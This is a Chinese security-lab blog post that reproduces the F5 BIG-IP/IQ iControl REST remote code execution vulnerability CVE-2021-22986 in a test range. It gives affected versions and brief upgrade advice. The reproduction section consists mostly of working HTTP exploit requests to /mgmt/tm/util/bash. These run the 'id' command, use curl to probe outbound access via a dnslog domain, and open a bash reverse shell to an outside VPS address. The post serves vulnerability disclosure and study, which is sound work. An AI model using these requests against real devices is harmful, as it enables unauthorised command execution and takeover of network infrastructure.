> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oJD-AMj04BFLr3_i3KGK4g)

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞简述**  

  

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。

2021 年 3 月 10 日，F5 官方发布安全通告，安全更新包含了影响 F5 的 BIG-IP，BIG-IQ 设备的多个高危漏洞，漏洞编号分别为 CVE-2021-22986，CVE-2021-22987，CVE-2021-22988，CVE-2021-22989，CVE-2021-22990，CVE-2021-22991，CVE-2021-22992；其中 CVE-2021-22986 为 F5 BIG-IP/IQ 设备 iControl REST 接口的未授权远程代码执行漏洞，漏洞评分 9.8，评级严重。F5 安全公告更新了 BIG-IP，BIG-IQ 中的多个严重漏洞。建议广大用户及时将 f5 big-iq,f5 big-ip 升级到最新版本，避免遭到攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 漏洞简述**  

  

BIG-IP 16.0.0-16.0.1  
       BIG-IP15.1.0-15.1.2  
       BIG-IP14.1.0-14.1.3.1  
       BIG-IP13.1.0-13.1.3.5  
       BIG-IP12.1.0-12.1.5.2  
       BIG-IQ7.1.0-7.1.0.2  
       BIG-IQ7.0.0-7.0.0.1  
       BIG-IQ6.0.0-6.1.0

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 漏洞复现**  

  

部署安装 F5 BIG-IPV 漏洞测试靶场环境。

1、访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtHghHXzDicprMoLSWf16Zby2yyiaZ9LgCF6Eamqzia6GkLn73ftj9TMZFibw/640?wx_fmt=png)

2、POC 验证，进行命令执行操作

1. 系统命令执行

```
POST/mgmt/tm/util/bash HTTP/1.1
Host: 192.168.3.112
Connection: close
Content-Length: 41
Cache-Control:max-age=0
Authorization: BasicYWRtaW46QVNhc1M=
X-F5-Auth-Token:
Upgrade-Insecure-Requests:1
Content-Type:application/json
 
{"command":"run","utilCmdArgs":"-c id"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtHElUZnT9KleLvmbyEib5ZuGy1uKBZjVdNbmJDJiaEImk6zqkMXo6xYyiaQ/640?wx_fmt=png)

2. 通过 dnslog 探测是否可以出网

生成域名：zg8ie5.dnslog.cn

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtHcT99VAT4ART8kk0TKIO7NJldKR4NcicmgF7qPFst0bosztiaeIKfbH9Q/640?wx_fmt=png)

出网探测

```
POST/mgmt/tm/util/bash HTTP/1.1
Host: 192.168.3.112
Connection: close
Content-Length: 62
Cache-Control:max-age=0
Authorization: BasicYWRtaW46QVNhc1M=
X-F5-Auth-Token:
Upgrade-Insecure-Requests:1
Content-Type:application/json
 
{"command":"run","utilCmdArgs":"-c 'curl zg8ie5.dnslog.cn'"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtHJwJeyiafYZ6L4Aae1BicOuZJpAnWd3obxcEefPiazVzXBvX8eeC7dHhwg/640?wx_fmt=png)

发现可以出网

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtH04Kb8iafbh3icgb8YXznhlQ91iaibKKgicNTeEzbdzkh89xA8YmLoyCqiaEw/640?wx_fmt=png)

3. 通过 bash 反弹 shell 到 vps

```
POST/mgmt/tm/util/bash HTTP/1.1
Host: 192.168.3.112
Connection: close
Content-Length: 83
Cache-Control:max-age=0
Authorization: BasicYWRtaW46QVNhc1M=
X-F5-Auth-Token:
Upgrade-Insecure-Requests:1
Content-Type:application/json
 
{"command":"run","utilCmdArgs":"-c 'bash -i >&/dev/tcp/6.6.6.6/12377 0>&1'"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDYVRXoZ4yYqEKWV78wwMtHryiadvOFQSMYHHJ7HGdPhllyib0CRZD1H39UNwBHrU6jgUI9akdhzBNw/640?wx_fmt=png)

  
      漏洞验证 python 脚本

```
https://github.com/PeiQi0/PeiQi-WIKI-POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**  

  

升级到最新版本

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x04 参考链接**  

  

https://mp.weixin.qq.com/s/ZtE7R4PPgdWY9ea06A9wqQ

https://mp.weixin.qq.com/s/lyrVwgSnu0iSehVr3lZiRw

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)